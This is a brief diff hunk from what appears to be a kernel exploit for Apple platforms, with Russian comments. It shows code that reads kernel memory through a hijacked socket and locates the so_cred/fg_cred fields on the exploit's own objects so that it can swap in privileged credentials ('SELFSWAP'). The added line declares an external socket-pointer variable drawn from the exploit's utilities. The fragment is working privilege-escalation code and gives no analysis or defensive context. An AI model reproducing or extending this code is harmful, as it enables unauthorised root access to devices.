@@ -8247,6 +8247,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     // (rwSocket → socket, наш fileglob) ищем qword == ucF —
                     // это точный оффсет so_cred/fg_cred. Свапаем ТОЛЬКО их.
                     if (rootZVA && ucF) {
+                        extern uint64_t rwSocketPcb;   // kutils.m / kexploit
                         kpNote(r, @"  [SELFSWAP] поиск so_cred/fg_cred на наших объектах");
                         uint64_t sockVA = 0;
                         if (rwSocketPcb) sockVA = kp_untag_ptr(early_kread64(rwSocketPcb + off_inpcb_inp_socket));
